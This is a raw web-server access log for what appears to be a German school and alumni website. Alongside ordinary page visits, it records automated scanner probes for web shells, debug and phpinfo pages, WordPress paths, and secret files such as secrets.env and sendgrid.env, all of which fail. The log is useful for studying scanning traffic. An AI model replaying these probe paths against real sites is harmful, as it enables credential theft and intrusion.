fd250b7d516fe819d0780d9c44c17141be6234a7df09993e93a021fb017ca171;2025-11-25 23:40:47;/;/wp-includes/SimplePie/Content/Type/;GET;404
fd250b7d516fe819d0780d9c44c17141be6234a7df09993e93a021fb017ca171;2025-11-25 23:40:48;/;/wp-includes/SimplePie/Content/;GET;404
fd250b7d516fe819d0780d9c44c17141be6234a7df09993e93a021fb017ca171;2025-11-25 23:40:49;/;/wp-includes/rest-api/endpoints/;GET;404
fd250b7d516fe819d0780d9c44c17141be6234a7df09993e93a021fb017ca171;2025-11-25 23:40:50;/;/wp-includes/rest-api/fields/;GET;404
fd250b7d516fe819d0780d9c44c17141be6234a7df09993e93a021fb017ca171;2025-11-25 23:40:51;/;/wp-includes/Requests/Cookie/;GET;404
fd250b7d516fe819d0780d9c44c17141be6234a7df09993e93a021fb017ca171;2025-11-25 23:40:51;/;/wp-includes/Requests/Proxy/;GET;404
fd250b7d516fe819d0780d9c44c17141be6234a7df09993e93a021fb017ca171;2025-11-25 23:40:53;/;/wp-includes/Requests/Response/;GET;404
fd250b7d516fe819d0780d9c44c17141be6234a7df09993e93a021fb017ca171;2025-11-25 23:40:53;/;/wp-includes/Requests/Transport/;GET;404
fd250b7d516fe819d0780d9c44c17141be6234a7df09993e93a021fb017ca171;2025-11-25 23:40:55;/;/wp-includes/Requests/Utility/;GET;404
fd250b7d516fe819d0780d9c44c17141be6234a7df09993e93a021fb017ca171;2025-11-25 23:40:55;/;/wp-includes/js/codemirror/;GET;404
fd250b7d516fe819d0780d9c44c17141be6234a7df09993e93a021fb017ca171;2025-11-25 23:40:56;/;/wp-includes/Requests/Exception/HTTP/;GET;404
fd250b7d516fe819d0780d9c44c17141be6234a7df09993e93a021fb017ca171;2025-11-25 23:40:57;/;/wp-includes/js/crop/;GET;404
fd250b7d516fe819d0780d9c44c17141be6234a7df09993e93a021fb017ca171;2025-11-25 23:40:58;/;/wp-includes/images/crystal/;GET;404
fd250b7d516fe819d0780d9c44c17141be6234a7df09993e93a021fb017ca171;2025-11-25 23:41:00;/;/wp-includes/images/media/;GET;404
fd250b7d516fe819d0780d9c44c17141be6234a7df09993e93a021fb017ca171;2025-11-25 23:41:02;/;/wp-includes/images/smilies/;GET;404
fd250b7d516fe819d0780d9c44c17141be6234a7df09993e93a021fb017ca171;2025-11-25 23:41:04;/;/wp-includes/images/wlw/;GET;404
fd250b7d516fe819d0780d9c44c17141be6234a7df09993e93a021fb017ca171;2025-11-25 23:41:05;/;/wp-includes/rest-api/search/;GET;404
fd250b7d516fe819d0780d9c44c17141be6234a7df09993e93a021fb017ca171;2025-11-25 23:41:06;/;/wp-includes/Requests/Exception/;GET;404
fd250b7d516fe819d0780d9c44c17141be6234a7df09993e93a021fb017ca171;2025-11-25 23:41:07;/;/wp-includes/Requests/Auth/;GET;404
fd250b7d516fe819d0780d9c44c17141be6234a7df09993e93a021fb017ca171;2025-11-25 23:41:08;/;/wp-includes/sodium_compat/src/;GET;404
fd250b7d516fe819d0780d9c44c17141be6234a7df09993e93a021fb017ca171;2025-11-25 23:41:08;/;/wp-includes/sitemaps/providers/;GET;404
fd250b7d516fe819d0780d9c44c17141be6234a7df09993e93a021fb017ca171;2025-11-25 23:41:09;/;/wp-includes/Text/Diff/Engine/Engine/;GET;404
fd250b7d516fe819d0780d9c44c17141be6234a7df09993e93a021fb017ca171;2025-11-25 23:41:11;/;/wp-includes/html-api/;GET;404
fd250b7d516fe819d0780d9c44c17141be6234a7df09993e93a021fb017ca171;2025-11-25 23:41:12;/;/wp-includes/php-compat/;GET;404
fd250b7d516fe819d0780d9c44c17141be6234a7df09993e93a021fb017ca171;2025-11-25 23:41:13;/;/wp-includes/PHPMailer/;GET;404
fd250b7d516fe819d0780d9c44c17141be6234a7df09993e93a021fb017ca171;2025-11-25 23:41:13;/;/wp-includes/random_compat/;GET;404
fd250b7d516fe819d0780d9c44c17141be6234a7df09993e93a021fb017ca171;2025-11-25 23:41:14;/;/wp-includes/sitemaps/;GET;404
fd250b7d516fe819d0780d9c44c17141be6234a7df09993e93a021fb017ca171;2025-11-25 23:41:16;/;/wp-includes/sodium_compat/;GET;404
fd250b7d516fe819d0780d9c44c17141be6234a7df09993e93a021fb017ca171;2025-11-25 23:41:16;/;/wp-includes/style-engine/;GET;404
fd250b7d516fe819d0780d9c44c17141be6234a7df09993e93a021fb017ca171;2025-11-25 23:41:17;/;/wp-includes/theme-compat/;GET;404
fd250b7d516fe819d0780d9c44c17141be6234a7df09993e93a021fb017ca171;2025-11-25 23:41:18;/;/wp-admin/css/colors/ectoplasm/;GET;404
fd250b7d516fe819d0780d9c44c17141be6234a7df09993e93a021fb017ca171;2025-11-25 23:41:19;/;/wp-admin/css/colors/;GET;404
fd250b7d516fe819d0780d9c44c17141be6234a7df09993e93a021fb017ca171;2025-11-25 23:41:20;/;/admin/images/slider/;GET;404
fd250b7d516fe819d0780d9c44c17141be6234a7df09993e93a021fb017ca171;2025-11-25 23:41:21;/;/admin/fckeditor/editor/filemanager/;GET;404
fd250b7d516fe819d0780d9c44c17141be6234a7df09993e93a021fb017ca171;2025-11-25 23:41:22;/;/sites/default/files/;GET;404
fd250b7d516fe819d0780d9c44c17141be6234a7df09993e93a021fb017ca171;2025-11-25 23:41:23;/;/admin/controller/extension/extension/;GET;404
fd250b7d516fe819d0780d9c44c17141be6234a7df09993e93a021fb017ca171;2025-11-25 23:41:24;/;/modules/mod_simplefileuploadv1.3/elements/;GET;404
fd250b7d516fe819d0780d9c44c17141be6234a7df09993e93a021fb017ca171;2025-11-25 23:41:25;/;/components/;GET;404
fd250b7d516fe819d0780d9c44c17141be6234a7df09993e93a021fb017ca171;2025-11-25 23:41:27;/;/admin/uploads/images/;GET;404
5de55b8959b9610ab1d55568560552f315afef64c847b8445923b96167e4b591;2025-11-25 23:46:41;/themen/details/david-gegen-goliath;/themen/details/david-gegen-goliath;GET;200
02e2f1393eb797f954fde586da58e8b3b44e5dbdecaba0160b1020eba89f1e91;2025-11-25 23:51:55;/?XDEBUG_SESSION_START=phpstorm;/?XDEBUG_SESSION_START=phpstorm;GET;200
f24d1909caea35c97685618b89a62a5847bffca73091a5173f5c01f6efaee5f1;2025-11-26 00:38:13;;/;GET;200
58ff364874807570bb9ec02714badbefc937bf46d0c7f325c86aab5356d71eed;2025-11-26 00:42:44;;/;GET;200
9381a638ea42b11a4f35a59c063f3246cd79bc228a026a3b88a93402f9654231;2025-11-26 00:43:25;/;/;GET;200
4930593579070d8400014d00f82962594eeb8916e0260fbc9535f659d679e588;2025-11-26 00:44:18;/themen/details/was-kommt-nach-dem-abitur;/themen/details/was-kommt-nach-dem-abitur;GET;200
1e8728677d4c953b723a1fc6ddcadefd8cc96cc5db939c175414b34555ec1911;2025-11-26 00:44:27;;/;GET;200
0a19235386815da20f6bfbfbfc29cdcb0d66558591880000be67db35f6bf09a4;2025-11-26 00:45:39;;/themen/details/stipendien-fur-den-zweiten-bildungsweg;GET;200
49d618914dfdcd706249aff898bf592ce2992bec0e22c1d543146ebc089b40ab;2025-11-26 00:51:00;;/owa/auth/logon.aspx;GET;404
5d06ed8cfcc2fc53c12800f0a1931005367a4917c066e5e22a2a591e0fb0cb1a;2025-11-26 00:54:03;/;/;PROPFIND;405
02e2f1393eb797f954fde586da58e8b3b44e5dbdecaba0160b1020eba89f1e91;2025-11-26 01:03:20;/actuator/gateway/routes;/actuator/gateway/routes;GET;404
70a2d5002469d4d9eeb364e295d8e0122eb88efa4f85c06de536f805b5ca83a1;2025-11-26 01:16:13;;/webshell;GET;404
6794b8e2b90abeec07c1ff924f9d6edb3485e87b73d2aa28625f78a93d0fddde;2025-11-26 01:17:51;;/docs/img/uml-aggregation.png;GET;404
c62e41d5f5aa18b6450daca438fcd13a0753236baf3b6b35333d4b091dd9bc8f;2025-11-26 01:21:58;;/veranstaltungen/details/sommerfest-am-treptow-kolleg;GET;200
5d06ed8cfcc2fc53c12800f0a1931005367a4917c066e5e22a2a591e0fb0cb1a;2025-11-26 01:29:10;/;/;PROPFIND;405
cc8417055bcb21276053f1a1cffd26f71d91f2815d519980526ae8e1c6d8476a;2025-11-26 01:30:02;;/webshell.php;GET;404
440155a5262249e187c5e5c938fb11741af48da34374c591733b2a2dca0cc641;2025-11-26 01:41:54;/themen/details/bucher-auf-dem-abstellgleis;/themen/details/bucher-auf-dem-abstellgleis;GET;200
570812b3c84ca776e38e95c8b1774f0b8522802b2532768e03fe3d229566394e;2025-11-26 01:42:13;;/shell.php;GET;404
40a1f2283eff6bb3fd0a255ce6912665b2e683b9abe74cb630ef2b9d1ebc840f;2025-11-26 01:46:04;;/;GET;200
bfcd1600217e65ebb67718322b1d7d0ebe50119b99c23722537d8bac86756b9b;2025-11-26 01:46:09;;/shell;GET;404
57f002ee29fe39f3d9f9e880fc9ab70d278e1bfaaafab11e4b93fb49bc2cb8e5;2025-11-26 01:53:59;;/;GET;200
4003cf9c85cc2f24b074e2804437b00db1f009e5447bcd68b4673f0b24acdf18;2025-11-26 02:07:51;;/;GET;200
e2ebe388b5543b50deb92cd65f22f2d2107cad2672da05a68b9603e7ba34f211;2025-11-26 02:08:41;;/;GET;200
436c14d5c21c229d06944e0f62307e7a3327fe5ce131091d794778f349faa66e;2025-11-26 02:12:56;;/;GET;200
727432de4eda32924bea72076502526ef0231f9a804cd7a5eae019b9df320119;2025-11-26 02:17:17;;/;GET;200
d2b075a1449b757466f7432d13337a4a338803e41165484e9ce5ea8bf594fcf9;2025-11-26 02:19:35;;/;GET;200
6759eca97b18a5e0bcb700a028202481d623355488d2818adf4bb4dcf11789dc;2025-11-26 02:23:13;;/;GET;200
f9cbd0944dba9fa3b68b72d604303099a185d35710db25009322aa83cd51e3e0;2025-11-26 02:25:45;/;/;GET;200
f38a109ae57e12e35321944f0fc0fbfa28762b997d6adc68a3c1f20bc0f26123;2025-11-26 02:32:35;;/;GET;200
c6f815cf1e24e7ddcf8d6056d055713d865fe1a6293f635144731c9dfc09f9e5;2025-11-26 02:37:56;/gruppen/hobby/abschlussfest;/gruppen/hobby/debattieren;GET;302
c6f815cf1e24e7ddcf8d6056d055713d865fe1a6293f635144731c9dfc09f9e5;2025-11-26 02:37:57;/gruppen/hobby/abschlussfest;/gruppen;GET;200
978682ef132668235997f8b81b8b4b65ef29c5f44c1534211cab69942cb92bbd;2025-11-26 02:48:00;;/gruppen;GET;200
9fb38cf23a674d53ead655351d152cbbcd6192f361eecf48f530fc31d55bc899;2025-11-26 02:58:30;;/;GET;200
9fb38cf23a674d53ead655351d152cbbcd6192f361eecf48f530fc31d55bc899;2025-11-26 02:58:30;;/;GET;200
9fb38cf23a674d53ead655351d152cbbcd6192f361eecf48f530fc31d55bc899;2025-11-26 02:58:32;;/sendgrid.env;GET;404
9fb38cf23a674d53ead655351d152cbbcd6192f361eecf48f530fc31d55bc899;2025-11-26 02:58:32;;/sendgrid.env;GET;404
9fb38cf23a674d53ead655351d152cbbcd6192f361eecf48f530fc31d55bc899;2025-11-26 02:58:33;;/twilio.env;GET;404
9fb38cf23a674d53ead655351d152cbbcd6192f361eecf48f530fc31d55bc899;2025-11-26 02:58:33;;/twilio.env;GET;404
9fb38cf23a674d53ead655351d152cbbcd6192f361eecf48f530fc31d55bc899;2025-11-26 02:58:35;;/phpinfo/;GET;404
9fb38cf23a674d53ead655351d152cbbcd6192f361eecf48f530fc31d55bc899;2025-11-26 02:58:35;;/phpinfo/;GET;404
9fb38cf23a674d53ead655351d152cbbcd6192f361eecf48f530fc31d55bc899;2025-11-26 02:58:38;;/app_dev.php/_profiler/phpinfo;GET;404
9fb38cf23a674d53ead655351d152cbbcd6192f361eecf48f530fc31d55bc899;2025-11-26 02:58:38;;/app_dev.php/_profiler/phpinfo;GET;404
9fb38cf23a674d53ead655351d152cbbcd6192f361eecf48f530fc31d55bc899;2025-11-26 02:58:40;;/.config.yaml;GET;404
9fb38cf23a674d53ead655351d152cbbcd6192f361eecf48f530fc31d55bc899;2025-11-26 02:58:40;;/.config.yaml;GET;404
9fb38cf23a674d53ead655351d152cbbcd6192f361eecf48f530fc31d55bc899;2025-11-26 02:58:41;;/secrets.env;GET;404
9fb38cf23a674d53ead655351d152cbbcd6192f361eecf48f530fc31d55bc899;2025-11-26 02:58:42;;/secrets.env;GET;404
9fb38cf23a674d53ead655351d152cbbcd6192f361eecf48f530fc31d55bc899;2025-11-26 02:58:44;;/debug/default/view?panel=config;GET;404
9fb38cf23a674d53ead655351d152cbbcd6192f361eecf48f530fc31d55bc899;2025-11-26 02:58:45;;/phpinfo.php;GET;404
9fb38cf23a674d53ead655351d152cbbcd6192f361eecf48f530fc31d55bc899;2025-11-26 02:58:45;;/debug/default/view?panel=config;GET;404
9fb38cf23a674d53ead655351d152cbbcd6192f361eecf48f530fc31d55bc899;2025-11-26 02:58:47;;/info/;GET;404
9fb38cf23a674d53ead655351d152cbbcd6192f361eecf48f530fc31d55bc899;2025-11-26 02:58:47;;/phpinfo.php;GET;404
9fb38cf23a674d53ead655351d152cbbcd6192f361eecf48f530fc31d55bc899;2025-11-26 02:58:48;;/info/;GET;404
9fb38cf23a674d53ead655351d152cbbcd6192f361eecf48f530fc31d55bc899;2025-11-26 02:58:50;;/test;GET;404
9fb38cf23a674d53ead655351d152cbbcd6192f361eecf48f530fc31d55bc899;2025-11-26 02:58:51;;/test;GET;404
d77d5fb305fe4efc3f8fe3924d95775943ffac6a0660eddf7a4e4b69f0329f07;2025-11-26 03:00:50;;/docs/img/gleichrichter.png;GET;404
c6f815cf1e24e7ddcf8d6056d055713d865fe1a6293f635144731c9dfc09f9e5;2025-11-26 03:03:17;/personen/alumni/details/sebastian-langhorst;/rechtliches/datenschutz;GET;200
242d0e9c32a13c08b150da7dbb44be25c356892ea858b72d633d3daa723c1104;2025-11-26 03:04:38;/personen/alumni/details/sebastian-langhorst;/personen/alumni/schule/5508;GET;200
f0b509a6017ac530a0763a0abc3e83edb93ef2c5d127169b5cbefdd4b6f3db72;2025-11-26 03:27:14;;/themen/details/wenn-sicherheit-sichtbar-wird;GET;200
b7217d69e8d0115bb190e4e14c6e43253cdf077156dab449d4a7433c7996b23e;2025-11-26 03:30:59;;/admin/config.php;GET;404
dda2344ddaa6cb18b4b587013b6c3c11b3544ebfa1e3d81b9322515d58b0f8b6;2025-11-26 03:37:06;/themen?category=community;/themen?category=community;GET;200
8841c6d8a686d8528fff47121fe2cd8ad5c774e94282d98867d12ee2db52dd5b;2025-11-26 03:41:31;;/themen/details/abschied-aus-moabit;GET;200
1b64654b82a7e332e74ed7735738a69668c5372f963d93597c2adc24bb352939;2025-11-26 03:46:43;/;/;GET;200
d90e1b61a8660c97e11dd9d0d347a50f4c4435960ed6e2e86217fc15a968841d;2025-11-26 03:53:19;;/sitemap.xml;GET;200
57419f856813934f349407347b5534d4b03a7aa9b57ee065612762308dc509ef;2025-11-26 04:12:15;;/;GET;200
5d805f0740041f39c329cf9634ba9cd4c8175fc53fbc96efc6594037872bc198;2025-11-26 04:21:06;/gruppen/hobby/abschlussfest;/gruppen/hobby/fotografie;GET;302
5d805f0740041f39c329cf9634ba9cd4c8175fc53fbc96efc6594037872bc198;2025-11-26 04:21:07;/gruppen/hobby/abschlussfest;/gruppen;GET;200
d86ea3c4cfc5e685076d09a7308f5d761982979e1338928619926e53115087b0;2025-11-26 04:23:43;;/;GET;200
8ab1b9165a0b227ddfe581c4ce7baf3bbad6a3d3b590e14e69394f641c565cf6;2025-11-26 04:34:41;/themen?category=kultur;/themen?category=kultur;GET;200
08bc5bc35f7a8e2308c21e3921c8f32aeeb61ec3e42447fccac9d2bb09dde080;2025-11-26 04:37:39;;/;GET;200
08bc5bc35f7a8e2308c21e3921c8f32aeeb61ec3e42447fccac9d2bb09dde080;2025-11-26 04:37:39;;//wp-includes/wlwmanifest.xml;GET;404
08bc5bc35f7a8e2308c21e3921c8f32aeeb61ec3e42447fccac9d2bb09dde080;2025-11-26 04:37:40;;//xmlrpc.php?rsd;GET;404
08bc5bc35f7a8e2308c21e3921c8f32aeeb61ec3e42447fccac9d2bb09dde080;2025-11-26 04:37:40;;/;GET;200
08bc5bc35f7a8e2308c21e3921c8f32aeeb61ec3e42447fccac9d2bb09dde080;2025-11-26 04:37:40;;//blog/wp-includes/wlwmanifest.xml;GET;404
08bc5bc35f7a8e2308c21e3921c8f32aeeb61ec3e42447fccac9d2bb09dde080;2025-11-26 04:37:40;;//web/wp-includes/wlwmanifest.xml;GET;404
08bc5bc35f7a8e2308c21e3921c8f32aeeb61ec3e42447fccac9d2bb09dde080;2025-11-26 04:37:40;;//wordpress/wp-includes/wlwmanifest.xml;GET;404
08bc5bc35f7a8e2308c21e3921c8f32aeeb61ec3e42447fccac9d2bb09dde080;2025-11-26 04:37:41;;//website/wp-includes/wlwmanifest.xml;GET;404
08bc5bc35f7a8e2308c21e3921c8f32aeeb61ec3e42447fccac9d2bb09dde080;2025-11-26 04:37:41;;//wp/wp-includes/wlwmanifest.xml;GET;404
08bc5bc35f7a8e2308c21e3921c8f32aeeb61ec3e42447fccac9d2bb09dde080;2025-11-26 04:37:41;;//news/wp-includes/wlwmanifest.xml;GET;404
08bc5bc35f7a8e2308c21e3921c8f32aeeb61ec3e42447fccac9d2bb09dde080;2025-11-26 04:37:41;;//2018/wp-includes/wlwmanifest.xml;GET;404
08bc5bc35f7a8e2308c21e3921c8f32aeeb61ec3e42447fccac9d2bb09dde080;2025-11-26 04:37:41;;//2019/wp-includes/wlwmanifest.xml;GET;404
08bc5bc35f7a8e2308c21e3921c8f32aeeb61ec3e42447fccac9d2bb09dde080;2025-11-26 04:37:42;;//shop/wp-includes/wlwmanifest.xml;GET;404
08bc5bc35f7a8e2308c21e3921c8f32aeeb61ec3e42447fccac9d2bb09dde080;2025-11-26 04:37:42;;//wp1/wp-includes/wlwmanifest.xml;GET;404
08bc5bc35f7a8e2308c21e3921c8f32aeeb61ec3e42447fccac9d2bb09dde080;2025-11-26 04:37:42;;//test/wp-includes/wlwmanifest.xml;GET;404
08bc5bc35f7a8e2308c21e3921c8f32aeeb61ec3e42447fccac9d2bb09dde080;2025-11-26 04:37:42;;//media/wp-includes/wlwmanifest.xml;GET;404
08bc5bc35f7a8e2308c21e3921c8f32aeeb61ec3e42447fccac9d2bb09dde080;2025-11-26 04:37:43;;//wp2/wp-includes/wlwmanifest.xml;GET;404
08bc5bc35f7a8e2308c21e3921c8f32aeeb61ec3e42447fccac9d2bb09dde080;2025-11-26 04:37:43;;//site/wp-includes/wlwmanifest.xml;GET;404
08bc5bc35f7a8e2308c21e3921c8f32aeeb61ec3e42447fccac9d2bb09dde080;2025-11-26 04:37:43;;//cms/wp-includes/wlwmanifest.xml;GET;404
08bc5bc35f7a8e2308c21e3921c8f32aeeb61ec3e42447fccac9d2bb09dde080;2025-11-26 04:37:43;;//sito/wp-includes/wlwmanifest.xml;GET;404
f5d643f705a901f12f74091b10d7aee086533cfd4c4e8d0471e12519f590412d;2025-11-26 04:44:44;/;/;PROPFIND;405
d5f087237eba114eafa57a154fe8e12624d1fbeba976cd9f788dccd6f0ee491d;2025-11-26 04:50:12;;/;GET;200
10d8a6a3df6d5cb65bf327f3a00ae98c08404f5b2a09d9870b918fbd418604a9;2025-11-26 04:54:50;;/;GET;200
0c345e32195a0a6d21b13b1cdb803944959f52e267dda600613012cf45620b22;2025-11-26 04:55:11;;/;GET;200
0c345e32195a0a6d21b13b1cdb803944959f52e267dda600613012cf45620b22;2025-11-26 04:55:14;;/sitemap.xml;GET;200
0db28e5cd9753fc20a89d6c3cc73afc769946358fc5d334d6d77c695e95a5c6c;2025-11-26 05:07:32;;/developmentserver/metadatauploader;GET;404
242d0e9c32a13c08b150da7dbb44be25c356892ea858b72d633d3daa723c1104;2025-11-26 05:08:27;/gruppen/hobby/abschlussfest;/gruppen/hobby/biologie;GET;302
242d0e9c32a13c08b150da7dbb44be25c356892ea858b72d633d3daa723c1104;2025-11-26 05:08:28;/gruppen/hobby/abschlussfest;/gruppen;GET;200
974b24cb599cdaca7088f2c4e2128012c81ac29dd14b51ad4d2b1849540aa8a2;2025-11-26 05:10:12;;/;GET;200
36b7b73e115bcf8095506612fbbfcf26d87042c20925e337ba72f36cd8dc079c;2025-11-26 05:15:37;;/;GET;200
c62e41d5f5aa18b6450daca438fcd13a0753236baf3b6b35333d4b091dd9bc8f;2025-11-26 05:29:09;;/veranstaltungen/details/sommerfest-am-treptow-kolleg;GET;200
ebf07fbebbaf6b18ab7315bd48406b44ebb680ff7b450ac2384d3d10ba97d3cb;2025-11-26 05:29:18;/personen/alumni/details/sebastian-langhorst;/personen/alumni/schule/9004;GET;200
56c00389a9884a04b2c3c1fd6eafd9d14a3de8ce0f683c4452f0f2eb47aa9dd2;2025-11-26 05:30:43;/gruppen/hobby/abschlussfest;/gruppen/hobby/tanzen;GET;302
56c00389a9884a04b2c3c1fd6eafd9d14a3de8ce0f683c4452f0f2eb47aa9dd2;2025-11-26 05:30:45;/gruppen/hobby/abschlussfest;/gruppen;GET;200
3ac5acbcc0a78a9717bd06364bfdd60e4be0806eea33d2f464833059de848c2d;2025-11-26 05:32:17;/themen/details/stipendien-fur-den-zweiten-bildungsweg;/themen/details/stipendien-fur-den-zweiten-bildungsweg;GET;200
4cbf07e5c0d9b72b93084a38117185266e12548519bd52093284c99b6d389aef;2025-11-26 05:42:54;/;/;GET;200
df510657f875274ae7bca76013926d063455a569b54fbfb9846f56734f6be5f0;2025-11-26 05:44:00;;/;GET;200
4b0896cff68196e785925c1cb6de7835a038141fb896cfccb804511f4b0dcb4b;2025-11-26 05:51:34;;/;GET;200
4b0896cff68196e785925c1cb6de7835a038141fb896cfccb804511f4b0dcb4b;2025-11-26 05:52:41;;/;GET;200
4b0896cff68196e785925c1cb6de7835a038141fb896cfccb804511f4b0dcb4b;2025-11-26 05:52:45;;/;GET;200
4b0896cff68196e785925c1cb6de7835a038141fb896cfccb804511f4b0dcb4b;2025-11-26 05:52:45;;/;GET;200
2dfc11274204fd687575b3ad8239b55fe22accf91613b4e7edf800257744d053;2025-11-26 06:02:45;;/themen/details/abschied-aus-moabit;GET;200
14265c540af84b97b6b817b4b4d1207abacc26118ed34596f5c5d0683ac47c07;2025-11-26 06:04:54;;/;GET;200
917e2ce768ddd61971f81829609fcabe5b1ae4d9b166b1a15e10571d4eea8434;2025-11-26 06:06:37;;/;GET;200
2278498d9791d8de095904fab90516ce70d8ea5b44108f0ba1fede1782894c69;2025-11-26 06:08:48;;/dns-query?dns=BAsBAAABAAAAAAAAB2V4YW1wbGUDY29tAAABAAE;GET;404
2278498d9791d8de095904fab90516ce70d8ea5b44108f0ba1fede1782894c69;2025-11-26 06:08:53;;/dns-query?name=example.com&type=A;GET;404
2278498d9791d8de095904fab90516ce70d8ea5b44108f0ba1fede1782894c69;2025-11-26 06:08:58;;/dns-query?dns=NWkBAAABAAAAAAAAB2V4YW1wbGUDY29tAAABAAE;GET;404
2278498d9791d8de095904fab90516ce70d8ea5b44108f0ba1fede1782894c69;2025-11-26 06:09:09;;/dns-query?name=example.com&type=A;GET;404
2278498d9791d8de095904fab90516ce70d8ea5b44108f0ba1fede1782894c69;2025-11-26 06:09:22;;/query?dns=KcwBAAABAAAAAAAAB2V4YW1wbGUDY29tAAABAAE;GET;404
2278498d9791d8de095904fab90516ce70d8ea5b44108f0ba1fede1782894c69;2025-11-26 06:09:44;;/query?name=example.com&type=A;GET;404
f8fe34bf5eb31f0e616e3cf11baf5b0ce203c13c48bacba8997dd78692133dc2;2025-11-26 06:11:51;;/;GET;200
4b0896cff68196e785925c1cb6de7835a038141fb896cfccb804511f4b0dcb4b;2025-11-26 06:18:17;;/;GET;200
4b0896cff68196e785925c1cb6de7835a038141fb896cfccb804511f4b0dcb4b;2025-11-26 06:21:49;;/;GET;200
66bdc8c9c5ff3a5e44344b9daa8210bfbb5f039befd207b80d0eac87fe95ca91;2025-11-26 06:29:54;/themen?category=wissenschaft;/themen?category=wissenschaft;GET;200
4b0896cff68196e785925c1cb6de7835a038141fb896cfccb804511f4b0dcb4b;2025-11-26 06:30:42;;/;GET;200
4b0896cff68196e785925c1cb6de7835a038141fb896cfccb804511f4b0dcb4b;2025-11-26 06:30:42;;/;GET;200
4b0896cff68196e785925c1cb6de7835a038141fb896cfccb804511f4b0dcb4b;2025-11-26 06:30:57;;/;GET;200
fc1a8e402e7aa3a1a288cb26973f158ba7ef1c640a0ffbdafd7656dd6adc147f;2025-11-26 06:47:28;;/;GET;200
e09688c9865b1a1abdea7004628f9e9c729f52011da9571188194e84cd98903a;2025-11-26 06:51:38;;/;GET;200
994cdf2a9d87f4b65f7101e01398e535979a38850f3f6189287ff80bc3b1b52a;2025-11-26 06:51:43;;/;GET;200
4cbf07e5c0d9b72b93084a38117185266e12548519bd52093284c99b6d389aef;2025-11-26 06:53:22;;/;GET;200
03e84a370cd3c57dd019628bff8d0c70f2e0d36c44daecf213c5b89fdf04de8a;2025-11-26 07:08:19;;/;GET;200
f558eb5f09f94ec55fcf61a154755e1f5c10bf6bcf1df5ceadac78b0854f3807;2025-11-26 07:09:55;;/gruppen;GET;200
03e84a370cd3c57dd019628bff8d0c70f2e0d36c44daecf213c5b89fdf04de8a;2025-11-26 07:13:27;;/webui/;GET;404
29d4330766a9f8f38641ddff315932cf37e2d017aa4328c52ce33bfbff0453b0;2025-11-26 07:18:13;;/;GET;200
29d4330766a9f8f38641ddff315932cf37e2d017aa4328c52ce33bfbff0453b0;2025-11-26 07:18:24;;/;GET;200
332ba7a92405cc263d9b6d575c96519d7339b45804c7ead6688993d086fbe061;2025-11-26 07:19:46;;/;GET;200
02e2f1393eb797f954fde586da58e8b3b44e5dbdecaba0160b1020eba89f1e91;2025-11-26 07:21:20;;/?XDEBUG_SESSION_START=phpstorm;GET;200
2360b72e32171da3897e81c2fe7896bc41c209228cb3fb1fd665945c9a8730c5;2025-11-26 07:27:48;/themen/details/erfolgreich-durch-die-abiturprufungen;/themen/details/erfolgreich-durch-die-abiturprufungen;GET;200
0bbfd6013794c68ba73c50ff2f88ac04bb8781a55784b4905caeec11298c4d41;2025-11-26 07:27:55;;/;GET;200
d9935b3e7fd70a2cea19515c08047a37c1d2ed30c2dae4812454cd4a23d2805d;2025-11-26 07:28:06;;/themen/details/wenn-sicherheit-sichtbar-wird;GET;200
03e84a370cd3c57dd019628bff8d0c70f2e0d36c44daecf213c5b89fdf04de8a;2025-11-26 07:33:00;;/geoserver/web/;GET;404
ba40ae471b350d0054ce3293bf1fad7836739f6b679738e5cd2b92a52dfb7534;2025-11-26 07:46:22;;/themen/details/david-gegen-goliath;GET;200
5d06ed8cfcc2fc53c12800f0a1931005367a4917c066e5e22a2a591e0fb0cb1a;2025-11-26 07:48:14;/;/;PROPFIND;405
7da266274949daedf4b5b4c1ddadcb523cd936f0a5607c33f28010a1ff130ae6;2025-11-26 07:48:15;;/;GET;200
628473e50eac71263462a0b958229f44bf3417c4225334b8b45d39d527abe670;2025-11-26 08:01:17;/login;/login;GET;200
628473e50eac71263462a0b958229f44bf3417c4225334b8b45d39d527abe670;2025-11-26 08:01:24;/login;/login;GET;200
628473e50eac71263462a0b958229f44bf3417c4225334b8b45d39d527abe670;2025-11-26 08:01:31;/login;/login;GET;200
0b3cea73c9b29742108d21a8bd7556dc9f7cdb766a897cef8b3c087e56036826;2025-11-26 08:08:45;;/veranstaltungen/details/sommerfest-am-treptow-kolleg;GET;200
c52c62fa6623376e0c7338d2d93be99602756268e3905872a5ce39ca56b20b49;2025-11-26 08:17:35;;/favicon.192x192.png;GET;404
a9dfab883557e3177f55d447bc107d59ff9cd7ecb5151eb7e51a769cb4f440eb;2025-11-26 08:19:34;;/;GET;200
af679e4e7aee756679a7218148e496fd2cb27ab4210a36fe646c1b0ed5cc0f99;2025-11-26 08:25:05;/themen/details/wenn-sicherheit-sichtbar-wird;/themen/details/wenn-sicherheit-sichtbar-wird;GET;200
f0c3aafa2979d3e013ac78f451319a4cea70dccda4157b9bd8e88fea676d3e0e;2025-11-26 08:31:30;;/;GET;200
34af1be451c29605cf296d08516cee74703accf2e0212bfe46e0f704a612d39a;2025-11-26 08:37:07;;/;GET;200
5023a630cb347439d408aa5d23d25b95467b5d8bd177a87c43a40a6beed8b29c;2025-11-26 08:38:41;/;/;GET;200
9370540c9ca1312bad46ff9ceaa69ba76e8fcf62e5ad9705c68242df8be6857f;2025-11-26 08:42:31;;/;GET;200
0205bdd6d5bac43b17c98ebdbf19d307e5579b0e1f1985629b4c2d1239a58edd;2025-11-26 08:44:49;;/themen/details/uni-zwischen-ebbe-und-flut;GET;200
4358fc79803fbdfd5997aa0b75b1bcad6d376b63cad1f260a4eef1de6f198b84;2025-11-26 08:49:18;;/;GET;200
242d0e9c32a13c08b150da7dbb44be25c356892ea858b72d633d3daa723c1104;2025-11-26 08:49:59;/aktuelles/meldungen/details/start-der-open-beta-jetzt-anmelden-und-testen;/aktuelles/meldungen?category=community;GET;200
dff02c98e5082040ee55831bf19ae7ba14ec994fc75a9291b84bd742ae493388;2025-11-26 08:51:05;;/;GET;200
d0a0e926dbd1bebe304e465cb407ed6babfe146cc50357b0c3dfe75f8fa93b8a;2025-11-26 08:51:13;;/;GET;200
3d0295db4aa80e3bcbbb2240f63950d84e07e32935cf82da0a12830ddc10da70;2025-11-26 08:54:11;/;/;GET;200
3839dc55bf51098b1d4c96fafbf341de7ec058b0bb1626ebb3b2ca1b0eed5904;2025-11-26 08:58:21;;/;GET;200
9545c81adbb78868bd26f153d9525fce2cc6ac856f25454ca71af7b9addc0c75;2025-11-26 09:11:48;;/aktuelles/stellenangebote;GET;200
